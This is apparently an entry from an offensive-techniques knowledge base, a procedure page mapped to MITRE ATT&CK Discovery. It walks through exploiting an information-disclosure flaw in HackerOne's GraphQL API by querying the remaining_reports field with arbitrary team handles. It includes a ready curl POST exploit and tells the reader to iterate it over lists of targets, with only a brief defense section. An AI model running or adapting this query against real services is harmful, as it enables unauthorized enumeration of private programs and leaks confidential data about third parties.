---
id: proc-query-graphql-reports
tags:
  - graphql
  - api-query
  - information-disclosure
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-query-remaining-reports]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:53.472Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Query GraphQL Remaining Reports

## Summary

This procedure executes a GraphQL query against HackerOne's API using an authenticated token and a target team handle to retrieve the remaining_reports field, which discloses trial report counts.

## Description

The core vulnerability lies in the User object's remaining_reports field, which, when queried with an arbitrary external program team_handle, reveals indicators of private programs (e.g., value 1 for trial reports). This requires authentication as a sandbox member and involves sending a POST request to the GraphQL endpoint with a crafted query.

## Requirements

1. Valid Bearer token from sandbox authentication
2. List of target team handles
3. HTTP client like curl
4. Knowledge of GraphQL syntax

## Defense

Defensive measures and detection strategies:

- Enforce strict authorization on remaining_reports field
- Validate team_handle against user's affiliations
- Log and alert on queries for external handles
- Implement query whitelisting

## Objectives

1. Probe specific team handles for report counts
2. Collect data indicating private program presence
3. Automate iteration over multiple handles

## Instructions

### Step 1: Prepare Authentication

**Context**: Set up headers with token for authenticated request.

Ensure you have the Bearer token from prior authentication.

> Expected output: Ready headers for curl.

### Step 2: Craft and Execute Query

**Context**: Send the GraphQL POST request using the target handle.

Execute [[commands/graphql-query-remaining-reports]] to verify:

```bash
curl -X POST https://api.hackerone.com/graphql -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"query":"query Report_submission_page{\n query {\n id,\n ...F0\n }\n}\nfragment F0 on Query {\n me {\n username,\n _remaining_reports3zrc4S:remaining_reports(team_handle:\"TARGET_HANDLE\")\n },\n id\n}","variables":{"first_0":100}}'
```

Replace YOUR_TOKEN and TARGET_HANDLE (e.g., "█████").

> Expected output: JSON with data.query.me._remaining_reports3zrc4S populated.

### Step 3: Iterate Over Handles

**Context**: Loop the query for each handle in the list.

Use a script (e.g., bash loop or Python) to automate sending queries for all handles.

> Expected output: Batch of responses for analysis.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-remaining-reports]]

## Tools Used


## Tags

- graphql
- api-query
